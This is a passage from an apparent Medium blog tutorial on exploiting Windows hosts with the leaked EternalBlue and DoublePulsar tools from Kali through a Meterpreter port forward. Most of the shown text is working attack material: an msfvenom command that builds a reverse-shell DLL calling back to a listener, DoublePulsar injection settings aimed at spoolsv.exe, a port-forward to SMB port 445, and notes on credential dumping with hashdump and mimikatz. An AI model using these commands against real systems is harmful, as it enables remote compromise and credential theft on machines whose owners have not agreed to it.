class="markup--strong markup--pre-strong">windows/x64/meterpreter/reverse_tcp</strong>):</pre><pre name="b57f" id="b57f" class="graf graf--pre graf-after--pre">Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)<br>   LHOST     <strong class="markup--strong markup--pre-strong">10.0.0.35</strong>        yes       The listen address<br>   LPORT     <strong class="markup--strong markup--pre-strong">4444             </strong>yes       The listen port</pre><pre name="39a7" id="39a7" class="graf graf--pre graf-after--pre">Exploit target:</pre><pre name="c7a8" id="c7a8" class="graf graf--pre graf-after--pre">Id  Name<br>   --  ----<br>   0   Wildcard Target</pre><figure name="db9a" id="db9a" class="graf graf--figure graf-after--pre"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 312px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 44.5%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*gpOLtgoyBa43hhiVH_aPOw.png" data-width="1146" data-height="510" data-action="zoom" data-action-value="1*gpOLtgoyBa43hhiVH_aPOw.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*gpOLtgoyBa43hhiVH_aPOw.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*gpOLtgoyBa43hhiVH_aPOw.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*gpOLtgoyBa43hhiVH_aPOw.png"></noscript></div></div><figcaption class="imageCaption">Reststart the Handler In Metasploit, Matching DLL Created With Msfvenom</figcaption></figure><p name="746c" id="746c" class="graf graf--p graf-after--figure">Next, from fuzzbunch run “use doublepulsar”. The module options are pretty straightforward. Be sure that the target port matches (9000 in this case) and when it comes time to pick a process to inject into, you might get mixed results depending on what you use. Lsass.exe is the default and for meterpreter it tends to be unstable in 7/2008, with commands like hashdump and mimikatz failing frequently, but has worked well in testing with XP. I’ve been having better luck with spoolsv.exe when exploit 7/2008.</p><p name="4bc1" id="4bc1" class="graf graf--p graf-after--p">Once configured, it should look something like this:</p><pre name="2e0a" id="2e0a" class="graf graf--pre graf-after--p">Local<br>=====</pre><pre name="ecad" id="ecad" class="graf graf--pre graf-after--pre">Proto   Listen IP        Source IP        Destination IP<br>-----   --------------   --------------   --------------<br>TCP     127.0.0.1:9000   Redirector:ANY   127.0.0.1:9000</pre><pre name="f6e7" id="f6e7" class="graf graf--pre graf-after--pre">Remote<br>======</pre><pre name="7858" id="7858" class="graf graf--pre graf-after--pre">*empty*</pre><pre name="7930" id="7930" class="graf graf--pre graf-after--pre">[!] Verify Redirection Tunnels Exist<br>[?] Press Any Key To Continue :</pre><pre name="dbfd" id="dbfd" class="graf graf--pre graf-after--pre">Module: Doublepulsar<br>====================</pre><pre name="d05b" id="d05b" class="graf graf--pre graf-after--pre">Name                  Set Value                               Redirected Value    <br>----                  ---------                               ----------------    <br>NetworkTimeout        60                                                          <br>TargetIp              127.0.0.1                               127.0.0.1           <br>TargetPort            9000                                    9000                <br>DllPayload            c:\fuzzbunch-debian\windows\file.dll                        <br>DllOrdinal            1                                                           <br>ProcessName           spoolsv.exe                                                 <br>ProcessCommandLine                                                                <br>Protocol              SMB                                                         <br>Architecture          x64                                                         <br>Function              RunDLL</pre><pre name="db7f" id="db7f" class="graf graf--pre graf-after--pre">[?] Execute Plugin? [Yes] :</pre><p name="f9d3" id="f9d3" class="graf graf--p graf-after--pre">A successful DLL injection will look like this:</p><figure name="1293" id="1293" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 543px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 77.60000000000001%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*MZXs8ml_y2eRQFtuJK2Hxw.png" data-width="1025" data-height="795" data-action="zoom" data-action-value="1*MZXs8ml_y2eRQFtuJK2Hxw.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*MZXs8ml_y2eRQFtuJK2Hxw.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*MZXs8ml_y2eRQFtuJK2Hxw.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*MZXs8ml_y2eRQFtuJK2Hxw.png"></noscript></div></div><figcaption class="imageCaption">Doublepulsar Injecting DLL</figcaption></figure><p name="9a78" id="9a78" class="graf graf--p graf-after--figure">And you should see a new meterpreter session in Metasploit:</p><figure name="85a8" id="85a8" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 461px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 65.9%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*zlGlxJBZ_feXjyFOapgQAw.png" data-width="1168" data-height="770" data-action="zoom" data-action-value="1*zlGlxJBZ_feXjyFOapgQAw.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*zlGlxJBZ_feXjyFOapgQAw.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*zlGlxJBZ_feXjyFOapgQAw.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*zlGlxJBZ_feXjyFOapgQAw.png"></noscript></div></div><figcaption class="imageCaption">Success!</figcaption></figure><p name="d5b5" id="d5b5" class="graf graf--p graf-after--figure">In the lab scenario depicted above the machine exploited with Eternalblue was x64, but this technique is also effective against x86 hosts as well as hosts running XP:</p><figure name="e4d6" id="e4d6" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 791px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 112.99999999999999%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*WbfOuYH-rH-ZkiwhxCX6LQ.png" data-width="979" data-height="1106" data-action="zoom" data-action-value="1*WbfOuYH-rH-ZkiwhxCX6LQ.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*WbfOuYH-rH-ZkiwhxCX6LQ.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*WbfOuYH-rH-ZkiwhxCX6LQ.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*WbfOuYH-rH-ZkiwhxCX6LQ.png"></noscript></div></div><figcaption class="imageCaption">Doublepulsar Against an x86 Victim Through a Portfwd Tunnel</figcaption></figure><h3 name="0e3a" id="0e3a" class="graf graf--h3 graf-after--figure">Reference:</h3><p name="4ebc" id="4ebc" class="graf graf--p graf-after--h3"><strong class="markup--strong markup--p-strong">mdiazcl’s Github Site With the Fuzzbunch Port to Debian:</strong></p><p name="c161" id="c161" class="graf graf--p graf-after--p"><a href="https://github.com/mdiazcl/fuzzbunch-debian" data-href="https://github.com/mdiazcl/fuzzbunch-debian" class="markup--anchor markup--p-anchor" rel="nofollow noopener nofollow noopener" target="_blank">https://github.com/mdiazcl/fuzzbunch-debian</a></p><p name="b30f" id="b30f" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Generate DLL Payload for DoublePulsar DLL Injection:</strong></p><pre name="3fcd" id="3fcd" class="graf graf--pre graf-after--p">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.35 lport=4444 — platform windows -f dll -o file.dll</pre><p name="2874" id="2874" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Start Fuzzbunch in Wine:</strong></p><pre name="2b5a" id="2b5a" class="graf graf--pre graf-after--p">#!/bin/bash<br>export WINEPREFIX=$HOME/.wine-fuzzbunch<br>cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows<br>wine cmd.exe<br>python fb.py</pre><p name="80f1" id="80f1" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Portfwd in Meterpreter:</strong></p><pre name="a7bd" id="a7bd" class="graf graf--pre graf-after--p">portfwd add -l 9000 -p 445 -r 192.168.55.65</pre><p name="dbf2" id="dbf2" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Offensive Security Portfwd Reference:</strong></p><p name="0646" id="0646" class="graf graf--p graf-after--p graf--trailing"><a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/" data-href="https://www.offensive-security.com/metasploit-unleashed/portfwd/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></p></div></div></section></div><footer class="u-paddingTop10"><div class="container u-maxWidth740"><div class="row"><div class="col u-size12of12"></div></div><div class="row"><div class="col u-size12of12 js-postTags"><div class="u-paddingBottom10"><ul class="tags tags--postTags tags--borderless"><li><a class="link u-baseColor--link"   href="https://medium.com/tag/hacking?source=post" data-action-source="post">Hacking</a></li><li><a class="link u-baseColor--link"   href="https://medium.com/tag/eternalblue?source=post" data-action-source="post">Eternalblue</a></li><li><a class="link u-baseColor--link"   href="https://medium.com/tag/ms17-010?source=post" data-action-source="post">Ms17 010</a></li><li><a class="link u-baseColor--link"   href="https://medium.com/tag/fuzzbunch?source=post" data-action-source="post">Fuzzbunch</a></li></ul></div></div></div><div class="postActions js-postActionsFooter "><div class="u-flexCenter"><div class="u-flex1"><div class="multirecommend js-actionMultirecommend u-flexCenter" data-post-id="edd877dfd724" data-is-icon-29px="true" data-is-circle="true" data-has-recommend-list="true" data-source="post_actions_footer-----edd877dfd724---------------------clap_footer" data-clap-string-singular="clap" data-clap-string-plural="claps"><div class="u-relative u-foreground"><button class="button button--large button--circle button--withChrome u-baseColor--buttonNormal button--withIcon button--withSvgIcon clapButton js-actionMultirecommendButton clapButton--darker clapButton--largePill u-relative u-foreground u-xs-paddingLeft13 u-width60 u-height60 u-accentColor--textNormal u-accentColor--buttonNormal clap-onboarding"  data-action="sign-up-prompt" data-sign-in-action="multivote" data-requires-token="true" data-redirect="https://medium.com/_/vote/p/edd877dfd724" data-action-source="post_actions_footer-----edd877dfd724---------------------clap_footer" aria-label="Clap"><span class="button-defaultState"><span class="svgIcon svgIcon--clap svgIcon--33px u-relative u-topNegative2 u-xs-top0"><svg class="svgIcon-use" width="33" height="33" ><path d="M28.86 17.342l-3.64-6.402c-.292-.433-.712-.729-1.163-.8a1.124 1.124 0 0 0-.889.213c-.63.488-.742 1.181-.33 2.061l1.222 2.587 1.4 2.46c2.234 4.085 1.511 8.007-2.145 11.663-.26.26-.526.49-.797.707 1.42-.084 2.881-.683 4.292-2.094 3.822-3.823 3.565-7.876 2.05-10.395zm-6.252 11.075c3.352-3.35 3.998-6.775 1.978-10.469l-3.378-5.945c-.292-.432-.712-.728-1.163-.8a1.122 1.122 0 0 0-.89.213c-.63.49-.742 1.182-.33 2.061l1.72 3.638a.502.502 0 0 1-.806.568l-8.91-8.91a1.335 1.335 0 0 0-1.887 1.886l5.292 5.292a.5.5 0 0 1-.707.707l-5.292-5.292-1.492-1.492c-.503-.503-1.382-.505-1.887 0a1.337 1.337 0 0 0 0 1.886l1.493 1.492 5.292 5.292a.499.499 0 0 1-.353.854.5.5 0 0 1-.354-.147L5.642 13.96a1.338 1.338 0 0 0-1.887 0 1.338 1.338 0 0 0 0 1.887l2.23 2.228 3.322 3.324a.499.499 0 0 1-.353.853.502.502 0 0 1-.354-.146l-3.323-3.324a1.333 1.333 0 0 0-1.886 0 1.325 1.325 0 0 0-.39.943c0 .356.138.691.39.943l6.396 6.397c3.528 3.53 8.86 5.313 12.821 1.353zM12.73 9.26l5.68 5.68-.49-1.037c-.518-1.107-.426-2.13.224-2.89l-3.303-3.304a1.337 1.337 0 0 0-1.886 0 1.326 1.326 0 0 0-.39.944c0 .217.067.42.165.607zm14.787 19.184c-1.599 1.6-3.417 2.392-5.353 2.392-.349 0-.7-.03-1.058-.082a7.922 7.922 0 0 1-3.667.887c-3.049 0-6.115-1.626-8.359-3.87l-6.396-6.397A2.315 2.315 0 0 1 2 19.724a2.327 2.327 0 0 1 1.923-2.296l-.875-.875a2.339 2.339 0 0 1 0-3.3 2.33 2.33 0 0 1 1.24-.647l-.139-.139c-.91-.91-.91-2.39 0-3.3.884-.884 2.421-.882 3.301 0l.138.14a2.335 2.335 0 0 1 3.948-1.24l.093.092c.091-.423.291-.828.62-1.157a2.336 2.336 0 0 1 3.3 0l3.384 3.386a2.167 2.167 0 0 1 1.271-.173c.534.086 1.03.354 1.441.765.11-.549.415-1.034.911-1.418a2.12 2.12 0 0 1 1.661-.41c.727.117 1.385.565 1.853 1.262l3.652 6.423c1.704 2.832 2.025 7.377-2.205 11.607zM13.217.484l-1.917.882 2.37 2.837-.454-3.719zm8.487.877l-1.928-.86-.44 3.697 2.368-2.837zM16.5 3.293L15.478-.005h2.044L16.5 3.293z" fill-rule="evenodd"/></svg></span></span><span class="button-activeState"><span class="svgIcon svgIcon--clapFilled svgIcon--33px u-relative u-topNegative2 u-xs-top0"><svg class="svgIcon-use" width="33" height="33" ><g fill-rule="evenodd"><path d="M29.58 17.1l-3.854-6.78c-.365-.543-.876-.899-1.431-.989a1.491 1.491 0 0 0-1.16.281c-.42.327-.65.736-.7 1.207v.001l3.623 6.367c2.46 4.498 1.67 8.802-2.333 12.807-.265.265-.536.505-.81.728 1.973-.222 3.474-1.286 4.45-2.263 4.166-4.165 3.875-8.6 2.215-11.36zm-4.831.82l-3.581-6.3c-.296-.439-.725-.742-1.183-.815a1.105 1.105 0 0 0-.89.213c-.647.502-.755 1.188-.33 2.098l1.825 3.858a.601.601 0 0 1-.197.747.596.596 0 0 1-.77-.067L10.178 8.21c-.508-.506-1.393-.506-1.901 0a1.335 1.335 0 0 0-.393.95c0 .36.139.698.393.95v.001l5.61 5.61a.599.599 0 1 1-.848.847l-5.606-5.606c-.001 0-.002 0-.003-.002L5.848 9.375a1.349 1.349 0 0 0-1.902 0 1.348 1.348 0 0 0 0 1.901l1.582 1.582 5.61 5.61a.6.6 0 0 1-.848.848l-5.61-5.61c-.51-.508-1.393-.508-1.9 0a1.332 1.332 0 0 0-.394.95c0 .36.139.697.393.952l2.363 2.362c.002.001.002.002.002.003l3.52 3.52a.6.6 0 0 1-.848.847l-3.522-3.523h-.001a1.336 1.336 0 0 0-.95-.393 1.345 1.345 0 0 0-.949 2.295l6.779 6.78c3.715 3.713 9.327 5.598 13.49 1.434 3.527-3.528 4.21-7.13 2.086-11.015zM11.817 7.727c.06-.328.213-.64.466-.893.64-.64 1.755-.64 2.396 0l3.232 3.232c-.82.783-1.09 1.833-.764 2.992l-5.33-5.33z"/><path d="M13.285.48l-1.916.881 2.37 2.837z"/><path d="M21.719 1.361L19.79.501l-.44 3.697z"/><path d="M16.502 3.298L15.481 0h2.043z"/></g></svg></span></span></button><div class="clapUndo u-width60 u-round u-height32 u-absolute u-borderBox u-paddingRight5 u-transition--transform200Springu-backgroundGrayLighter js-clapUndo" style="top: 14px; padding: 2px;"><button class="button button--chromeless u-baseColor--buttonNormal button--withIcon button--withSvgIcon u-floatRight"  data-action="multivote-undo" data-action-value="edd877dfd724"><span class="svgIcon svgIcon--removeThin svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M20.13 8.11l-5.61 5.61-5.609-5.61-.801.801 5.61 5.61-5.61 5.61.801.8 5.61-5.609 5.61 5.61.8-.801-5.609-5.61 5.61-5.61" fill-rule="evenodd"/></svg></span></button></div></div><span class="u-relative u-background js-actionMultirecommendCount u-marginLeft16"><button class="button button--chromeless u-baseColor--buttonNormal js-multirecommendCountButton u-textColorDarker"  data-action="show-recommends" data-action-value="edd877dfd724">8 claps</button><span class="u-xs-hide"></span></span></div></div><div class="buttonSet u-flex0"><button class="button button--large button--dark button--chromeless is-touchIconBlackPulse u-baseColor--buttonDark button--withIcon button--withSvgIcon u-xs-hide u-marginRight12"  title="Share on Twitter" aria-label="Share on Twitter" data-action="share-on-twitter" data-action-source="post_actions_footer"><span class="svgIcon svgIcon--twitterFilled svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M22.053 7.54a4.474 4.474 0 0 0-3.31-1.455 4.526 4.526 0 0 0-4.526 4.524c0 .35.04.7.082 1.05a12.9 12.9 0 0 1-9.3-4.77c-.39.69-.61 1.46-.65 2.26.03 1.6.83 2.99 2.02 3.79-.72-.02-1.41-.22-2.02-.57-.01.02-.01.04 0 .08-.01 2.17 1.55 4 3.63 4.44-.39.08-.79.13-1.21.16-.28-.03-.57-.05-.81-.08.54 1.77 2.21 3.08 4.2 3.15a9.564 9.564 0 0 1-5.66 1.94c-.34-.03-.7-.06-1.05-.08 2 1.27 4.38 2.02 6.94 2.02 8.31 0 12.86-6.9 12.84-12.85.02-.24.01-.43 0-.65.89-.62 1.65-1.42 2.26-2.34-.82.38-1.69.62-2.59.72a4.37 4.37 0 0 0 1.94-2.51c-.84.53-1.81.9-2.83 1.13z"/></svg></span></button><a class="button button--dark button--chromeless u-baseColor--buttonDark button--withIcon button--withSvgIcon button--dark button--chromeless u-xs-hide u-marginRight12"   href="https://medium.com/p/edd877dfd724/share/facebook" title="Share on Facebook" aria-label="Share on Facebook" target="_blank" data-action-source="post_actions_footer"><span class="button-defaultState"><span class="svgIcon svgIcon--facebookSquare svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M23.209 5H5.792A.792.792 0 0 0 5 5.791V23.21c0 .437.354.791.792.791h9.303v-7.125H12.72v-2.968h2.375v-2.375c0-2.455 1.553-3.662 3.741-3.662 1.049 0 1.95.078 2.213.112v2.565h-1.517c-1.192 0-1.469.567-1.469 1.397v1.963h2.969l-.594 2.968h-2.375L18.11 24h5.099a.791.791 0 0 0 .791-.791V5.79a.791.791 0 0 0-.791-.79"/></svg></span></span></a><button class="button button--large button--dark button--chromeless u-baseColor--buttonDark button--withIcon button--withSvgIcon u-xs-show u-marginRight10"  title="Share this story on Twitter or Facebook" aria-label="Share this story on Twitter or Facebook" data-action="show-share-popover" data-action-source="post_actions_footer"><span class="svgIcon svgIcon--share svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M20.385 8H19a.5.5 0 1 0 .011 1h1.39c.43 0 .84.168 1.14.473.31.305.48.71.48 1.142v10.77c0 .43-.17.837-.47 1.142-.3.305-.71.473-1.14.473H8.62c-.43 0-.84-.168-1.144-.473a1.603 1.603 0 0 1-.473-1.142v-10.77c0-.43.17-.837.48-1.142A1.599 1.599 0 0 1 8.62 9H10a.502.502 0 0 0 0-1H8.615c-.67 0-1.338.255-1.85.766-.51.51-.765 1.18-.765 1.85v10.77c0 .668.255 1.337.766 1.848.51.51 1.18.766 1.85.766h11.77c.668 0 1.337-.255 1.848-.766.51-.51.766-1.18.766-1.85v-10.77c0-.668-.255-1.337-.766-1.848A2.61 2.61 0 0 0 20.384 8zm-8.67-2.508L14 3.207v8.362c0 .27.224.5.5.5s.5-.23.5-.5V3.2l2.285 2.285a.49.49 0 0 0 .704-.001.511.511 0 0 0 0-.708l-3.14-3.14a.504.504 0 0 0-.71 0L11 4.776a.501.501 0 0 0 .71.706" fill-rule="evenodd"/></svg></span></button><button class="button button--large button--dark button--chromeless is-touchIconBlackPulse u-baseColor--buttonDark button--withIcon button--withSvgIcon"  data-action="scroll-to-responses" data-action-source="post_actions_footer"><span class="svgIcon svgIcon--response svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M21.27 20.058c1.89-1.826 2.754-4.17 2.754-6.674C24.024 8.21 19.67 4 14.1 4 8.53 4 4 8.21 4 13.384c0 5.175 4.53 9.385 10.1 9.385 1.007 0 2-.14 2.95-.41.285.25.592.49.918.7 1.306.87 2.716 1.31 4.19 1.31.276-.01.494-.14.6-.36a.625.625 0 0 0-.052-.65c-.61-.84-1.042-1.71-1.282-2.58a5.417 5.417 0 0 1-.154-.75zm-3.85 1.324l-.083-.28-.388.12a9.72 9.72 0 0 1-2.85.424c-4.96 0-8.99-3.706-8.99-8.262 0-4.556 4.03-8.263 8.99-8.263 4.95 0 8.77 3.71 8.77 8.27 0 2.25-.75 4.35-2.5 5.92l-.24.21v.32c0 .07 0 .19.02.37.03.29.1.6.19.92.19.7.49 1.4.89 2.08-.93-.14-1.83-.49-2.67-1.06-.34-.22-.88-.48-1.16-.74z"/></svg></span></button><button class="button button--chromeless u-baseColor--buttonNormal u-marginRight12"  data-action="scroll-to-responses">1</button><button class="button button--large button--dark button--chromeless is-touchIconFadeInPulse u-baseColor--buttonDark button--withIcon button--withSvgIcon button--bookmark js-bookmarkButton"  title="Bookmark this story to read later" aria-label="Bookmark this story to read later" data-action="sign-up-prompt" data-sign-in-action="add-to-bookmarks" data-requires-token="true" data-redirect="https://medium.com/_/bookmark/p/edd877dfd724" data-action-source="post_actions_footer"><span class="button-defaultState"><span class="svgIcon svgIcon--bookmark svgIcon--29px u-marginRight4"><svg class="svgIcon-use" width="29" height="29" ><path d="M19.385 4h-9.77A2.623 2.623 0 0 0 7 6.615V23.01a1.022 1.022 0 0 0 1.595.847l5.905-4.004 5.905 4.004A1.022 1.022 0 0 0 22 23.011V6.62A2.625 2.625 0 0 0 19.385 4zM21 23l-5.91-3.955-.148-.107a.751.751 0 0 0-.884 0l-.147.107L8 23V6.615C8 5.725 8.725 5 9.615 5h9.77C20.275 5 21 5.725 21 6.615V23z" fill-rule="evenodd"/></svg></span></span><span class="button-activeState"><span class="svgIcon svgIcon--bookmarkFilled svgIcon--29px u-marginRight4"><svg class="svgIcon-use" width="29" height="29" ><path d="M19.385 4h-9.77A2.623 2.623 0 0 0 7 6.615V23.01a1.022 1.022 0 0 0 1.595.847l5.905-4.004 5.905 4.004A1.022 1.022 0 0 0 22 23.011V6.62A2.625 2.625 0 0 0 19.385 4z" fill-rule="evenodd"/></svg></span></span></button><button class="button button--large button--dark button--chromeless is-touchIconBlackPulse u-baseColor--buttonDark button--withIcon button--withSvgIcon js-moreActionsButton"  title="More actions" aria-label="More actions" data-action="more-actions"><span class="svgIcon svgIcon--more svgIcon--25px"><svg class="svgIcon-use" width="25" height="25"  viewBox="-480.5 272.5 21 21"><path d="M-463 284.6c.9 0 1.6-.7 1.6-1.6s-.7-1.6-1.6-1.6-1.6.7-1.6 1.6.7 1.6 1.6 1.6zm0 .9c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5zm-7-.9c.9 0 1.6-.7 1.6-1.6s-.7-1.6-1.6-1.6-1.6.7-1.6 1.6.7 1.6 1.6 1.6zm0 .9c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5zm-7-.9c.9 0 1.6-.7 1.6-1.6s-.7-1.6-1.6-1.6-1.6.7-1.6 1.6.7 1.6 1.6 1.6zm0 .9c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5z"/></svg></span></button></div></div></div></div><div class="u-maxWidth740 u-paddingTop20 u-marginTop20 u-borderTopLightest container u-paddingBottom20 u-xs-paddingBottom10 js-postAttributionFooterContainer"><div class="row js-postFooterInfo"><div class="col u-size12of12"><li class="uiScale uiScale-ui--small uiScale-caption--regular u-block u-paddingBottom18 js-cardUser"><div class="u-marginLeft20 u-floatRight"><span class="followState js-followState" data-user-id="5652bace719b"><button class="button button--small u-noUserSelect button--withChrome u-baseColor--buttonNormal button--withHover button--unblock js-unblockButton"  data-action="sign-up-prompt" data-sign-in-action="toggle-block-user" data-requires-token="true" data-redirect="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724" data-action-source="footer_card"><span class="button-label  button-defaultState">Blocked</span><span class="button-label button-hoverState">Unblock</span></button><button class="button button--primary button--small u-noUserSelect button--withChrome u-accentColor--buttonNormal button--follow js-followButton"  data-action="sign-up-prompt" data-sign-in-action="toggle-subscribe-user" data-requires-token="true" data-redirect="https://medium.com/_/subscribe/user/5652bace719b" data-action-source="footer_card-5652bace719b-------------------------follow_footer"><span class="button-label  button-defaultState js-buttonLabel">Follow</span><span class="button-label button-activeState">Following</span></button></span></div><div class="u-tableCell"><a class="link u-baseColor--link avatar"   href="https://medium.com/@joe_norton?source=footer_card" title="Go to the profile of Joe Norton" aria-label="Go to the profile of Joe Norton" data-action-source="footer_card" data-user-id="5652bace719b" dir="auto"><img  src="https://cdn-images-1.medium.com/fit/c/60/60/1*dmbNkD5D-u45r44go_cf0g.png" class="avatar-image avatar-image--small" alt="Go to the profile of Joe Norton"></a></div><div class="u-tableCell u-verticalAlignMiddle u-breakWord u-paddingLeft15"><h3 class="ui-h3 u-fontSize18 u-lineHeightTighter u-marginBottom4"><a class="link link--primary u-accentColor--hoverTextNormal"   href="https://medium.com/@joe_norton" property="cc:attributionName" title="Go to the profile of Joe Norton" aria-label="Go to the profile of Joe Norton" rel="author cc:attributionUrl" data-user-id="5652bace719b" dir="auto">Joe Norton</a></h3></div></li></div></div></div><div class="js-postFooterPlacements"></div><div class="u-padding0 u-clearfix u-backgroundGrayLightest u-print-hide supplementalPostContent js-responsesWrapper"></div><div class="supplementalPostContent js-heroPromo"></div></footer></article></main><aside class="u-marginAuto u-maxWidth1000 js-postLeftSidebar"><div class="u-foreground u-top0 u-transition--fadeOut300 u-fixed u-sm-hide js-postShareWidget"><ul><li class="u-marginVertical10"><div class="multirecommend js-actionMultirecommend u-flexCenter" data-post-id="edd877dfd724" data-is-icon-29px="true" data-has-recommend-list="true" data-source="post_share_widget-----edd877dfd724---------------------clap_sidebar"><div class="u-relative u-foreground"><button class="button button--primary button--large button--chromeless u-accentColor--buttonNormal button--withIcon button--withSvgIcon clapButton js-actionMultirecommendButton clapButton--darker"  data-action="sign-up-prompt" data-sign-in-action="multivote" data-requires-token="true" data-redirect="https://medium.com/_/vote/p/edd877dfd724" data-action-source="post_share_widget-----edd877dfd724---------------------clap_sidebar" aria-label="Clap"><span class="button-defaultState"><span class="svgIcon svgIcon--clap svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><g fill-rule="evenodd"><path d="M13.739 1l.761 2.966L15.261 1z"/><path d="M16.815 4.776l1.84-2.551-1.43-.471z"/><path d="M10.378 2.224l1.84 2.551-.408-3.022z"/><path d="M22.382 22.622c-1.04 1.04-2.115 1.507-3.166 1.608.168-.14.332-.29.492-.45 2.885-2.886 3.456-5.982 1.69-9.211l-1.101-1.937-.955-2.02c-.315-.676-.235-1.185.245-1.556a.836.836 0 0 1 .66-.16c.342.056.66.28.879.605l2.856 5.023c1.179 1.962 1.379 5.119-1.6 8.098m-13.29-.528l-5.02-5.02a1 1 0 0 1 .707-1.701c.255 0 .512.098.707.292l2.607 2.607a.442.442 0 0 0 .624-.624L6.11 15.04l-1.75-1.75a.998.998 0 1 1 1.41-1.413l4.154 4.156a.44.44 0 0 0 .624 0 .44.44 0 0 0 0-.624l-4.152-4.153-1.172-1.171a.998.998 0 0 1 0-1.41 1.018 1.018 0 0 1 1.41 0l1.172 1.17 4.153 4.152a.437.437 0 0 0 .624 0 .442.442 0 0 0 0-.624L8.43 9.222a.988.988 0 0 1-.291-.705.99.99 0 0 1 .29-.706 1 1 0 0 1 1.412 0l6.992 6.993a.443.443 0 0 0 .71-.501l-1.35-2.856c-.315-.676-.235-1.185.246-1.557a.85.85 0 0 1 .66-.16c.342.056.659.28.879.606L20.628 15c1.573 2.876 1.067 5.545-1.544 8.156-1.396 1.397-3.144 1.966-5.063 1.652-1.713-.286-3.463-1.248-4.928-2.714zM12.99 6.976l2.562 2.562c-.497.607-.563 1.414-.155 2.284l.265.562-4.257-4.257a.98.98 0 0 1-.117-.445c0-.267.104-.517.292-.706a1.023 1.023 0 0 1 1.41 0zm8.887 2.06c-.375-.557-.902-.916-1.486-1.011a1.738 1.738 0 0 0-1.342.332c-.376.29-.61.656-.712 1.065a2.1 2.1 0 0 0-1.095-.562 1.776 1.776 0 0 0-.992.128l-2.636-2.636a1.883 1.883 0 0 0-2.658 0 1.862 1.862 0 0 0-.478.847 1.886 1.886 0 0 0-2.671-.012 1.867 1.867 0 0 0-.503.909c-.754-.754-1.992-.754-2.703-.044a1.881 1.881 0 0 0 0 2.658c-.288.12-.605.288-.864.547a1.884 1.884 0 0 0 0 2.659l.624.622a1.879 1.879 0 0 0-.91 3.16l5.019 5.02c1.595 1.594 3.515 2.645 5.408 2.959a7.16 7.16 0 0 0 1.173.098c1.026 0 1.997-.24 2.892-.7.279.04.555.065.828.065 1.53 0 2.969-.628 4.236-1.894 3.338-3.338 3.083-6.928 1.738-9.166l-2.868-5.043z"/></g></svg></span></span><span class="button-activeState"><span class="svgIcon svgIcon--clapFilled svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><g fill-rule="evenodd"><path d="M13.738 1l.762 